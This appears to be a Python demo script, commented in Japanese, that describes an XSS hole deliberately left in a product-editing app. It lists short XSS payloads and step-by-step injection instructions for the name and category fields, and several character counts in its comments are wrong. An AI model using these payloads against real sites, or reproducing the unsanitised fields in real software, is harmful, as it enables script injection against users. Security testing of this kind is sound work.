#!/usr/bin/env python3
"""
商品編集XSS脆弱性デモンストレーション

このスクリプトは実装された脆弱性の動作を確認するためのものです。

脆弱性の概要:
1. name: 17文字制限、サニタイズなし → XSS脆弱性
2. description: 文字数制限なし、サニタイズあり → XSS対策済み  
3. category: 17文字制限、サニタイズなし → XSS脆弱性
"""

def main():
    print("=== 商品編集XSS脆弱性デモ ===\n")
    
    print("🔴 脆弱性のあるフィールド:")
    print("  • name (商品名): 17文字制限、サニタイズなし")
    print("  • category (カテゴリ): 17文字制限、サニタイズなし")
    print()
    
    print("🟢 安全なフィールド:")
    print("  • description (説明): サニタイズあり")
    print()
    
    print("💻 テスト用XSSペイロード:")
    
    # 17文字以内のXSSペイロード
    payloads = [
        "<script>alert(1)</script>",  # 23文字 - 制限オーバー
        "<img src=x onerror=alert(1)>",  # 26文字 - 制限オーバー  
        "\"><script>alert(1)</script>",  # 25文字 - 制限オーバー
        "'+alert(1)+'",  # 12文字 - OK
        "<svg onload=a()>",  # 15文字 - OK
        "'-alert(1)-'",  # 12文字 - OK
        "'><script>a()</script>",  # 21文字 - 制限オーバー
        "\"><img src=x onerror=alert(1)>",  # 30文字 - 制限オーバー
        "javascript:alert(1)",  # 19文字 - 制限オーバー
        "<h1>XSS</h1>",  # 12文字 - OK
    ]
    
    print("\n17文字以内のペイロード (制限内):")
    for payload in payloads:
        if len(payload) <= 17:
            print(f"  ✓ {payload} ({len(payload)}文字)")
    
    print("\n17文字を超えるペイロード (制限オーバー):")
    for payload in payloads:
        if len(payload) > 17:
            print(f"  ✗ {payload} ({len(payload)}文字)")
    
    print("\n🔧 テスト手順:")
    print("1. 管理者でログイン (user_id=1)")
    print("2. /admin/products でXSS用商品を追加:")
    print("   - 商品名: '<h1>XSS</h1>' (12文字)")  
    print("   - カテゴリ: '<img src=x>' (12文字)")
    print("   - 説明: '<script>alert(1)</script>' (サニタイズされる)")
    print("3. 商品一覧で結果確認")
    print("4. 既存商品を編集してXSSペイロード注入")
    print()
    
    print("⚠️  実際のペイロード例:")
    safe_payloads = [p for p in payloads if len(p) <= 17]
    for i, payload in enumerate(safe_payloads[:3], 1):
        print(f"   {i}. name: '{payload}'")
        print(f"      category: '{payload}'")
        print()
    
    print("📋 期待される動作:")
    print("- nameとcategoryでHTMLが実行される (脆弱性)")
    print("- descriptionではHTMLがエスケープされる (安全)")
    print("- 17文字を超える入力は拒否される")

if __name__ == "__main__":
    main()